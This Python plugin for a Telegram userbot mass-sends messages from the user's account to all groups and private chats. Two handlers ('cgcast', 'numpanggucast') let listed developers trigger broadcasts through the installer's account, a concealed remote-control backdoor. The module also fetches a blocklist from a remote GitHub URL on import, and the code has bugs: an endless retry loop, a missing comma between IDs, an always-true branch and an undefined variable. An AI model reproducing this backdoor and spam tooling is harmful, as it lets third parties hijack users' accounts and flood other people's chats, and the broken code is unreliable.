import asyncio

import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from requests import get

from config import BLACKLIST_GCAST
from config import CMD_HANDLER
from X.helpers.adminHelpers import DEVS
from X.helpers.basic import edit_or_reply
from X.helpers.misc import HAPP, in_heroku
from X.helpers.tools import get_arg
from X.utils.misc import restart

from .help import *

while 0 < 6:
    _GCAST_BLACKLIST = get(
        "https://raw.githubusercontent.com/iamuput/eizy/UputtNande/blacklistgcast.json"
    )
    if _GCAST_BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        GCAST_BLACKLIST = [-1001608701614, -1001614473542, -1001986858575, -1001451642443, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1002049199615, -1001565255751, -1001287188817, -1001876092598, -1001562283549, -1001001951726069, -1001861414061]
    GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
    break

del _GCAST_BLACKLIST


@Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("gcast", cmd) & filters.me)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await edit_or_reply(message, "`Limit Don't blame JAPANESE X USERBOT, Started global broadcast...`")
    else:
        return await message.edit_text("**The message is Where to fuck**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in GCAST_BLACKLIST and chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**✅So successful, send:** `{done}` \n **❌Failed like this too send** `{error}`"
    )


@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("gucast", cmd) & filters.me)
async def gucast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await edit_or_reply(message, "`Limit Don't Blame Me, fucking Coward, Started global broadcast...`")
    else:
        return await message.edit_text("**The message is Where to fuck**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Man.edit_text(
        f"**Successfully Send Message To** `{done}` **chat here, failed to send message to** `{error}` **chat Too, Sorry**"
    )


@Client.on_message(filters.command("blchat", cmd) & filters.me)
async def blchatgcast(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    list = BLACKLIST_GCAST.replace(" ", "\n» ")
    if blacklistgc == "True":
        await edit_or_reply(
            message,
            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n» {list}\n\nKetik `{cmd}addblacklist` in the group you want to add to the list blacklist gcast.",
        )
    else:
        await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")


@Client.on_message(filters.command("addbl", cmd) & filters.me)
async def addblacklist(client: Client, message: Message):
    Man = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await message.edit(
            "**Please Add Var** `HEROKU_APP_NAME` **to add blacklist**",
        )
    blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await message.edit(
        f"**Added Successfully** `{message.chat.id}` **to the list blacklist gcast.**\n\n Currently Restarting Heroku to Apply Changes."
    )
    if await in_heroku():
        heroku_var = HAPP.config()
        heroku_var["BLACKLIST_GCAST"] = blacklistgrup
    else:
        path = dotenv.find_dotenv("config.env")
        dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
    restart()


@Client.on_message(filters.command("delbl", cmd) & filters.me)
async def delblacklist(client: Client, message: Message):
    Man = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await message.edit(
            "**Please Add Var** `HEROKU_APP_NAME` **to add blacklist**",
        )
    gett = str(message.chat.id)
    if gett in blchat:
        blacklistgrup = blchat.replace(gett, "")
        await message.edit(
            f"**Successfully Delete** `{message.chat.id}` **from list blacklist gcast.**\n\n Currently Restarting Heroku to Apply Changes."
        )
        if await in_heroku():
            heroku_var = HAPP.config()
            heroku_var["BLACKLIST_GCAST"] = blacklistgrup
        else:
            path = dotenv.find_dotenv("config.env")
            dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
        restart()
    else:
        await message.edit("**This group is not on the list blacklist gcast.**")


add_command_help(
    "broadcast",
    [
        [
            "gcast <text/reply>",
            "Send a Global Broadcast message to all groups you are in. (Can Send Media/Sticker)",
        ],
        [
            "gucast <text/reply>",
            "Sends Global Broadcast messages to all incoming Private Massage / PCs. (Can Send Media/Sticker)",
        ],
        [
            "blchat",
            "To check list information blacklist gcast.",
        ],
        [
            "addbl",
            "To Add the group to blacklist gcast.",
        ],
        [
            "delbl",
            f"To Delete the group from blacklist gcast.\n\n  •  **Note : **Type command** `{cmd}addblacklist` **dan** `{cmd}delblacklist` **in your group Blacklist.",
        ],
    ],
                  )
